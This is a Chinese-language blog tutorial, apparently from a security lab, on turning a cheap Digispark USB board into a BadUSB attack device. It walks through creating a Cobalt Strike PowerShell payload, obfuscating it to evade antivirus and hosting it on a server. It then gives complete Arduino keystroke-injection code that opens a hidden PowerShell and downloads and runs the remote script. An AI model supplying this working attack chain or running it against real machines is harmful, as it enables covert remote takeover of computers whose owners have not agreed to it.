<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TkxbPFJckYrZEB8Z1c7kgg)

![](https://mmbiz.qpic.cn/mmbiz_png/xDBba1f2ZXKA1bENGfWdH3h0VC2lM2bzGf0bibtcQTFAkzQdrianFeMWwwHOp1hla5kjZFpuwibxp4eTsnDIV3ZyA/640?wx_fmt=png)

点击上方蓝字关注我们

**BadUsb制作**  

型号：

Digispark kickstarter 微型USB开发板   ATTINY58

就是下面这种

x宝有卖9元左右。

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWicYz7JVCyIHVQEHvaXyZJkT0d9AthzPialEgELYKgBZTcjG9zwOY6h1w/640?wx_fmt=png)img

一. 准备：
======

attiny驱动下载：https://www.arduino.cc/en/Main/Software?setlang=cn

Arduino IDE：https://www.arduino.cc/en/software

免杀工具（自选）：https://github.com/danielbohannon/Invoke-Obfuscation

CobaltStrike且有公网IP

二、CS payload制作+免杀
=================

1.生成脚本
------

(1). 需要一台安装了CobaltStrike的公网IP服务器，生成powershell可执行程序，格式为ps1

大略说下重点，其他自行百度CS powershell马生成。

(2)

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWKxOg49IISEJqnJceXPqjISauqyZKQBnZUricu7AFqZy5HsFloHgJHOA/640?wx_fmt=png)img![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWFP02bdWyZalfiaykWsR2ILel9XkteveJVibLovqm3gVKFCUibF5bmunXw/640?wx_fmt=png)img

然后选择生成的路径进行保存。我这里保存在桌面的badusb文件夹，文件名为payload.ps1

2. 免杀处理(Invoke-Obfuscation)
---------------------------

免杀工具下载地址：https://github.com/danielbohannon/Invoke-Obfuscation

(1)管理员权限运行powershell

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWvKJKyOLAA8xElyxfcSuzj9GO5z7hkuOz4mS3IsIzDiaV12B8QPbdpvg/640?wx_fmt=png)img

进入到下载的文件Invoke-Obfuscation-master文件夹下：cd  xxxx\xxxx\xxx\Invoke-Obfuscation-master

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWZf1FtEhYTgDvzFx85n6bc3cTuVVoNh1EyBTNbtmPPKrYBn31SqWvxQ/640?wx_fmt=png)img

然后依次输入下面的代码：

```
Import-Module C:\文件的路径\Desktop\badusb\Invoke-Obfuscation-master\Invoke-Obfuscation.psd1 # 导入模块，要注意路径  
Invoke-Obfuscation  

```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWiaSupcCcFIfrb6ibQ3jyZicb0faJCEhI9W1y9MjXice9tFDoic0ZvibNsevw/640?wx_fmt=png)img

然后依次输入：

```
set scriptpath C:\文件路径\Desktop\badusb\payload.ps1 # cs生成payload的路径  
encoding  

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWn2UcR8gQI0NJT7OaiapPJ9x2ZXXKdI4s2JtZ4dLUDz6zRQqUSUMvyyg/640?wx_fmt=png)img

```
 out shell.ps1  #  输出,默认输出在软件所在文件夹。
```

### 1. 驱动下载和安装

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWvk47iaAoUliaXv1YUmiaQvicibAmGklIyaD89FELXfdzP5obUiaUOUJqkxRQ/640?wx_fmt=png)img

输出成功后会自己用记事本打开。

_然后需要将生成的ps1文件上传到自己服务器网站下，通过建立网站，构造下载链接，例如http://xx.xx.xx.xx:9999/shell.ps1，实现访问链接就可以下载这个文件的效果。_

三、编写程序，写入开发板
============

### 1. 将开发板usb插入到电脑上，电脑会自动安装驱动，如果没有安装成功（设备管理器查看是否有黄色问号，有就是没有装好，那就安装）

下载网址：https://www.arduino.cc/en/Main/Software?setlang=cn

### 2. 下载工具：Arduino IDE

下载网址：https://www.arduino.cc/en/software

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWUbnoWpUvj8sTlIIvBt3BJekRqXC1zUKjbGtCd46RCWLTF3594lZfQQ/640?wx_fmt=png)img![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWm4jweYcz0ibhz7jywiaIvyichDjXv640mvfDwNPes2iaaTmfahIUBTgrqQ/640?wx_fmt=png)img

（1）打开Arduino IDE进行设置

*   文件-首选项，在附加开发板管理网站填入网址：http://digistump.com/package_digistump_index.json
    
*   软件会下载索引，时间可能有点久，视网络情况，如果不成功，使用代理爬梯子下载
    

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuW1SpWHeD3TsRTZlCyqBsVzW4NEwPpqhvR1oEwiabIWhkRuicIVicAziaQzA/640?wx_fmt=png)img

*   工具——开发板——开发板管理，下载Arduino AVR Boards，安装之后才会显示版本号，版本号为1.6.7
    

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWicapH3oX6WzkPIpYtKwT7Zp6icdGytQqr3fnG36bT8qOtnTPib8xdxl0g/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWQfU6DmyN1M3g4J2h5u3FaQZ6Nen1fFVT9ib7K8lFAr464ibey4gUzT0A/640?wx_fmt=png)

*   安装完成后，进行如下选择：
    

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWdWnFicce2Ht9v4taWwLSpgnQ8ibLfhCj15ib3ymXKEXI2mflKLu4EpduA/640?wx_fmt=png)img

（2）将下列代码填入IDE中，并对服务器及生成的shell地址进行修改。实现通过伪造键盘，输出win+r打开cmd输入powershell命令，下载文件并运行。

```
#include "DigiKeyboard.h"  
#define KEY_ESC     41  
#define KEY_BACKSPACE 42  
#define KEY_TAB     43  
#define KEY_PRT_SCR 70  
#define KEY_DELETE  76  
  
void setup() {  
  
DigiKeyboard.delay(2000);  
DigiKeyboard.sendKeyStroke(0);  
DigiKeyboard.delay(2000);  
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  
DigiKeyboard.delay(500);  
# 将下面ip替换为自己网站服务器的IP，实现访问url便触发下载的操作。  
DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString('http://XX.XX.XX.XX:XXXX/shell.ps1');"));  
DigiKeyboard.delay(500);  
DigiKeyboard.sendKeyStroke(KEY_ENTER);  
DigiKeyboard.delay(750);  
DigiKeyboard.sendKeyStroke(KEY_ENTER);  
  
}  
void loop() {  
}  

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWstdq37svAeRJfbYdbcV1ic3ky9R9o3FN88cgeibicehxHOVLicWB5OeWMQ/640?wx_fmt=png)img

（3）点击左上角的对号进行编译测试，不报错就可以进行下一步。

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWHpuzc1Q2tUnDsOWmBiafb3kxgWGMrGFkfAF0GfnfIeky9n6QS5vm29A/640?wx_fmt=png)img

（4）暂时不需要将开发板插到电脑上，先拔下来。

然后点击左上角的上传：

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWUDTr2qWRQ248volUm9EnicD1jqXJicrdow4rQ97DlMRp2ajI4ab27RLw/640?wx_fmt=png)img

编译成功后，会显示请在60s内插入设备，然后插入设备，等待上传。

上传成功图

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWurEz3tJPz8Ll2rvTkXwic9RRvKBX8hK9p8VFCZUpTrZcV8oqRmR0h3w/640?wx_fmt=png).

### 3. 不出意外，几秒内，机器会打开cmd，然后输入命令运行。

需要注意的是，要保证输入法在英文状态下，才能成功，中文状态下会被输入中文，导致不成功。

### 4. CS也有主机上线

![](https://mmbiz.qpic.cn/mmbiz_png/vO9lTNquul9uywNiaTUamgFd36OckMUuWgc6waF5LgLkRoRUa6W4BlfoSYBnD7t8LAxk5kiacic02Xdg5vYghm7nQ/640?wx_fmt=png)img

Tips：开发板重新上传脚本的话，可以拔下开发板，然后IDE上传，显示在60s内插入开发板后，再将开发板插入电脑，等待上传就OK了。

初版经过多次测试，有部分杀毒软件是会有弹窗的。

![](https://mmbiz.qpic.cn/mmbiz_png/sfviaLicLevtu9Wd1DLZ3Egag5Mh1icxbwXu5wKo3Us0s94y01TMr341XuCPDE9pWRv0lSN8fkQuib9smrib7iccPRxQ/640?wx_fmt=png)

end

![](https://mmbiz.qpic.cn/mmbiz_png/RMvr65sMTU7sdS4sNTg13Lcz3zXSZVMDml6icEjEXrvMamia29C973WU97ibALuK4tsL7D1ls3SX5anIiaNwZOcx3g/640?wx_fmt=png)

  

实验室简介：

乌特拉安全实验室，致力于实战化攻防、红队评估、渗透测试、代码审计、CTF比赛、应急响应等多领域安全研究。

  

![](https://mmbiz.qpic.cn/mmbiz_png/3wAU40iaiaJzCyFgm72ooL4mPwJ21btH6vmMZOg53X0liaGke7muYswenwJmds5AcojKK3FIsW89dLNb1y4qJZdPQ/640?wx_fmt=png)

  

▼

  

快关注我吧  

  

  

UTRA_Sec![](https://mmbiz.qpic.cn/mmbiz_jpg/vO9lTNquulib3O4ooyH4LdlkoCtH1GupeXkcGRcpXL6ibodFcyzfRxBXPCpCB188cTy1GwEG3YaIDFia3ibQxzAajQ/640?wx_fmt=jpeg)

扫码关注获取更多精彩

  

![](https://mmbiz.qpic.cn/mmbiz_gif/PiaeMVgzBvjWrMFqrWpiabGVCRamV3ptQAGk08zYJMURkwn0NicnKP4RJfuvFYu0l3tUibCnmrwjzydmL07YZc46qA/640?wx_fmt=gif)

  

  

往期推荐

[

红蓝对抗｜记一次攻防演练



](https://mp.weixin.qq.com/s?__biz=MzkwMDMxMzIzNA==&mid=2247487742&idx=1&sn=e483f6e665c5bec7fa81fe9ba6cf989a&chksm=c044a903f733201533abac8545ff619f5d892f28800b84c87dfd2188bd78ad84d5289e527f55&scene=21#wechat_redirect)

[

攻防纪实｜从任意文件下载到命令执行



](https://mp.weixin.qq.com/s?__biz=MzkwMDMxMzIzNA==&mid=2247487562&idx=1&sn=fc77ce0358f70f174832d390ae4133b2&chksm=c044a9b7f73320a12f801e015c529cbd5971e82fab9c021f336ad0b356acbc6cedc47a794603&scene=21#wechat_redirect)

[

WriteUP｜Vulfocus 靶场竞赛



](https://mp.weixin.qq.com/s?__biz=MzkwMDMxMzIzNA==&mid=2247488333&idx=1&sn=76a003e6e210507147df94a48d7011da&chksm=c044aab0f73323a67efae41a8997e9ba75001213330abe48a4da76af0280b9e8cbbacc52f835&scene=21#wechat_redirect)

[

加密解密｜关于前端加密登录绕过的渗透思路



](https://mp.weixin.qq.com/s?__biz=MzkwMDMxMzIzNA==&mid=2247487834&idx=1&sn=c63f1571ed1eb7087bbb14d27c2f6ca0&chksm=c044a8a7f73321b1e026fbab67dc4951599566f5b58894d1b2ea65cdc53d5c3f993ac3487afa&scene=21#wechat_redirect)

[

渗透测试｜记一次token验证之转走你的余额



](https://mp.weixin.qq.com/s?__biz=MzkwMDMxMzIzNA==&mid=2247485664&idx=1&sn=babf01ed94437f7394a85384775cfdef&chksm=c044b11df733380bf7d775fd6423f104e962b9edbd1f6c3ac59eec9da3f29f1c201ee900ac70&scene=21#wechat_redirect)

[

马氏五连鞭EduSrc漏洞挖掘



](https://mp.weixin.qq.com/s?__biz=MzkwMDMxMzIzNA==&mid=2247484537&idx=1&sn=ef010d30c084797b0331e91ab73f22ab&chksm=c044bd84f73334923a164a205c505cd2669db4458e603c75faaa5e653ee0c997ee3a2a07cbeb&scene=21#wechat_redirect)